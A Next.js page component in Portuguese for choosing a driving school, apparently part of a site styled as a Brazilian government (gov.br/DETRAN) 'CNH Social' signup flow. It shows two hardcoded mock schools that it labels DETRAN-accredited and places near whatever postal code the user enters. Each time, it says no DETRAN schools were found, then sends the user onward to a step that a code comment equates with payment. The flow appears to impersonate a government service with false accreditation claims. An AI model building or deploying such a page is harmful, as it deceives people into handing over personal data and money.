'use client';

import { useEffect, useState, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';
import GovLayout from '@/components/GovLayout';
import { useAuth } from '@/contexts/AuthContext';
import { Bike, Car, Star, MapPin } from 'lucide-react';

interface CepData {
  localidade: string;
  uf: string;
  bairro?: string;
  logradouro?: string;
}

interface Autoescola {
  id: number;
  nome: string;
  rating: number;
  distancia: string;
  imagem: string;
  categorias: Array<'A' | 'B' | 'AB'>;
}

const autoescolasMock: Autoescola[] = [
  {
    id: 1,
    nome: 'Escola de Condutores Moto São José',
    rating: 4.0,
    distancia: '4.5 km',
    imagem: '/banner-promocional-1.png',
    categorias: ['A', 'B', 'AB']
  },
  {
    id: 2,
    nome: 'Academia de Condutores Especializada',
    rating: 4.0,
    distancia: '5.3 km',
    imagem: '/banner-promocional-1.png',
    categorias: ['A', 'B', 'AB']
  }
];

function AutoescolasContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { user } = useAuth();
  const [userName, setUserName] = useState('');
  const [cidade, setCidade] = useState<string>('');
  const [uf, setUf] = useState<string>('');
  const [isLoading, setIsLoading] = useState(true);
  const [categoriaSelecionada, setCategoriaSelecionada] = useState<Record<number, string>>({});
  const [autoescolaSelecionando, setAutoescolaSelecionando] = useState<number | null>(null);
  const [cepInput, setCepInput] = useState('');
  const [showCepInput, setShowCepInput] = useState(true);

  useEffect(() => {
    const userData = localStorage.getItem('usuarioLogado');
    if (userData) {
      const userParsed = JSON.parse(userData);
      const primeiroNome = userParsed.nome?.split(' ')[0] || '';
      setUserName(primeiroNome.toUpperCase());
    }

    const cep = searchParams.get('cep');
    if (cep) {
      setShowCepInput(false);
      setCepInput(cep);
      
      // Salvar CEP no localStorage
      const userBasicData = typeof window !== 'undefined' 
        ? JSON.parse(localStorage.getItem('userBasicData') || '{}')
        : {};
      
      localStorage.setItem('userBasicData', JSON.stringify({
        ...userBasicData,
        cep: cep.replace(/\D/g, '')
      }));

      buscarCep(cep);
    } else {
      setIsLoading(false);
    }
  }, [searchParams]);

  const buscarCep = async (cep: string) => {
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cep.replace(/\D/g, '')}/json/`);
      const data: CepData = await response.json();
      
      if (data.localidade && data.uf) {
        setCidade(data.localidade);
        setUf(data.uf);
      }
    } catch (error) {
      console.error('Erro ao buscar CEP:', error);
      setCidade('sua região');
      setUf('');
    } finally {
      setIsLoading(false);
    }
  };

  const handleCepSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cepInput || cepInput.replace(/\D/g, '').length !== 8) {
      return;
    }
    
    setIsLoading(true);
    setShowCepInput(false);
    
    // Salvar CEP no localStorage
    const userBasicData = typeof window !== 'undefined' 
      ? JSON.parse(localStorage.getItem('userBasicData') || '{}')
      : {};
    
    localStorage.setItem('userBasicData', JSON.stringify({
      ...userBasicData,
      cep: cepInput.replace(/\D/g, '')
    }));
    
    await buscarCep(cepInput);
  };

  const formatCep = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 5) return numbers;
    return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`;
  };

  const handleCategoriaClick = (autoescolaId: number, categoria: string) => {
    setCategoriaSelecionada(prev => ({
      ...prev,
      [autoescolaId]: prev[autoescolaId] === categoria ? '' : categoria
    }));
  };

  const handleSelecionarAutoescola = async (autoescolaId: number) => {
    const categoria = categoriaSelecionada[autoescolaId];
    if (!categoria) return;

    setAutoescolaSelecionando(autoescolaId);
    
    const autoescola = autoescolasMock.find(a => a.id === autoescolaId);
    
    const userBasicData = typeof window !== 'undefined' 
      ? JSON.parse(localStorage.getItem('userBasicData') || '{}')
      : {};
    
    localStorage.setItem('userBasicData', JSON.stringify({
      ...userBasicData,
      autoescola: autoescola?.nome || 'Autoescola Selecionada',
      categoria: categoria,
      categoriaFormatada: categoria === 'A' ? 'Motocicleta' : categoria === 'B' ? 'Automóvel' : 'Automóvel e Motocicleta'
    }));
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Redirecionar para efetiva (equivalente a pagamento no fluxo B)
    const cep = cepInput.replace(/\D/g, '');
    router.push(`/efetiva?autoescola=${autoescolaId}&categoria=${categoria}&cep=${cep}`);
  };

  const handleBack = () => {
    router.push('/taxa');
  };

  if (showCepInput) {
    return (
      <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Autoescolas']}>
        <div className="w-full max-w-md mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">6</div>
            <p className="font-semibold text-base">Localizar Autoescolas</p>
          </div>
          
          <div className="bg-gray-50 p-6 rounded-md">
            <p className="text-gray-700 mb-4 text-base">
              Digite seu CEP para encontrarmos as autoescolas credenciadas mais próximas de você.
            </p>
            
            <form onSubmit={handleCepSubmit} className="space-y-4">
              <div>
                <label htmlFor="cep" className="block text-sm font-medium text-gray-700 mb-1">
                  CEP
                </label>
                <input
                  id="cep"
                  type="text"
                  value={cepInput}
                  onChange={(e) => setCepInput(formatCep(e.target.value))}
                  placeholder="00000-000"
                  maxLength={9}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-[#1351B4] focus:border-[#1351B4] outline-none text-base"
                />
              </div>
              
              <div className="flex gap-4">
                <button
                  type="button"
                  onClick={handleBack}
                  className="flex-1 border-2 border-[#1351B4] text-[#1351B4] font-semibold py-3 px-6 rounded-full text-base transition-all hover:bg-[#1351B4]/5"
                >
                  Voltar
                </button>
                <button
                  type="submit"
                  disabled={cepInput.replace(/\D/g, '').length !== 8}
                  className="flex-1 bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  Buscar
                </button>
              </div>
            </form>
          </div>
        </div>
      </GovLayout>
    );
  }

  if (isLoading) {
    return (
      <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Autoescolas']}>
        <div className="w-full">
          <div className="flex items-center gap-3 mb-6">
            <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">6</div>
            <p className="font-semibold text-base">Selecione uma Autoescola</p>
          </div>
          
          <div className="flex flex-col items-center justify-center py-16">
            <div className="h-16 w-16 animate-spin rounded-full border-4 border-gray-200 border-t-[#1351B4]"></div>
            <p className="mt-4 text-base text-gray-700">Buscando autoescolas próximas...</p>
          </div>
        </div>
      </GovLayout>
    );
  }

  return (
    <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Autoescolas']}>
      <div className="w-full">
        <div className="flex items-center gap-3 mb-4">
          <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">6</div>
          <p className="font-semibold text-base">Selecione uma Autoescola</p>
        </div>
        
        <p className="text-gray-600 mb-6">
          Encontramos estas opções perto de{' '}
          <span className="font-semibold">{cidade}{uf ? `, ${uf}` : ''}</span>
        </p>

        <div className="space-y-6">
          <div className="rounded-md bg-yellow-100 p-4 text-sm text-yellow-800">
            <p>
              <strong>Atenção:</strong> Não encontramos autoescolas do DETRAN na sua região. 
              Exibindo as parceiras mais próximas.
            </p>
          </div>

          {autoescolasMock.map((autoescola) => (
            <div key={autoescola.id} className="overflow-hidden rounded-lg border bg-white shadow-sm">
              <div className="p-4">
                <div className="flex flex-col gap-4 md:flex-row md:items-start">
                  <div className="w-full flex-shrink-0 md:w-48">
                    <Image
                      src={autoescola.imagem}
                      alt="Foto da Autoescola"
                      width={192}
                      height={108}
                      className="h-28 w-full rounded-md object-cover"
                    />
                  </div>

                  <div className="flex-grow">
                    <h3 className="mb-1 text-lg font-bold text-gray-800">{autoescola.nome}</h3>
                    
                    <div className="mb-2 flex items-center space-x-3 text-sm text-gray-600">
                      <div className="flex items-center">
                        <Star className="mr-1 h-4 w-4 fill-yellow-500 text-yellow-500" />
                        <span className="font-semibold">{autoescola.rating.toFixed(1)}</span>
                      </div>
                      <span>•</span>
                      <div className="flex items-center">
                        <MapPin className="mr-1 h-4 w-4" />
                        <span>{autoescola.distancia}</span>
                      </div>
                    </div>

                    <p className="mb-3 text-sm text-gray-500">
                      Localizada próximo a <span className="font-medium">{cidade}</span>, 
                      esta autoescola é credenciada pelo DETRAN e está pronta para te atender.
                    </p>

                    <div className="flex flex-wrap gap-2 text-xs">
                      <span className="rounded-full bg-green-100 px-2 py-1 font-medium text-green-800">
                        Credenciada DETRAN
                      </span>
                      <span className="rounded-full bg-blue-100 px-2 py-1 font-medium text-blue-800">
                        CNH Social
                      </span>
                    </div>
                  </div>

                  <div className="w-full flex-shrink-0 space-y-2 md:w-48">
                    <button
                      onClick={() => handleCategoriaClick(autoescola.id, 'A')}
                      className={`flex w-full items-center justify-between rounded-md border p-2 text-left transition-colors ${
                        categoriaSelecionada[autoescola.id] === 'A'
                          ? 'border-[#1351B4] bg-[#1351B4]/5'
                          : 'border-gray-300 hover:bg-gray-50'
                      }`}
                    >
                      <div className="flex items-center">
                        <Bike className="mr-2 h-5 w-5 text-[#1351B4]" />
                        <span className="font-semibold">Moto (A)</span>
                      </div>
                    </button>

                    <button
                      onClick={() => handleCategoriaClick(autoescola.id, 'B')}
                      className={`flex w-full items-center justify-between rounded-md border p-2 text-left transition-colors ${
                        categoriaSelecionada[autoescola.id] === 'B'
                          ? 'border-[#1351B4] bg-[#1351B4]/5'
                          : 'border-gray-300 hover:bg-gray-50'
                      }`}
                    >
                      <div className="flex items-center">
                        <Car className="mr-2 h-5 w-5 text-[#1351B4]" />
                        <span className="font-semibold">Carro (B)</span>
                      </div>
                    </button>

                    <button
                      onClick={() => handleCategoriaClick(autoescola.id, 'AB')}
                      className={`flex w-full items-center justify-between rounded-md border p-2 text-left transition-colors ${
                        categoriaSelecionada[autoescola.id] === 'AB'
                          ? 'border-[#1351B4] bg-[#1351B4]/5'
                          : 'border-gray-300 hover:bg-gray-50'
                      }`}
                    >
                      <div className="flex items-center">
                        <Bike className="mr-1 h-5 w-5 text-[#1351B4]" />
                        <Car className="mr-2 h-5 w-5 text-[#1351B4]" />
                        <span className="font-semibold">Carro+Moto</span>
                      </div>
                    </button>
                  </div>
                </div>
              </div>

              <div className="bg-gray-50 px-4 py-3">
                <button
                  onClick={() => handleSelecionarAutoescola(autoescola.id)}
                  disabled={!categoriaSelecionada[autoescola.id] || autoescolaSelecionando !== null}
                  className="flex w-full items-center justify-center gap-2 rounded-full bg-[#1351B4] px-6 py-3 text-base font-semibold text-white shadow-sm transition-colors hover:bg-[#0D3C8C] disabled:cursor-not-allowed disabled:bg-gray-400"
                >
                  {autoescolaSelecionando === autoescola.id ? (
                    <>
                      <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                      <span>Carregando...</span>
                    </>
                  ) : (
                    'Selecionar Autoescola'
                  )}
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </GovLayout>
  );
}

export default function AutoescolasPage() {
  return (
    <Suspense fallback={
      <div className="flex min-h-screen items-center justify-center">
        <div className="h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-[#1351B4]"></div>
      </div>
    }>
      <AutoescolasContent />
    </Suspense>
  );
}
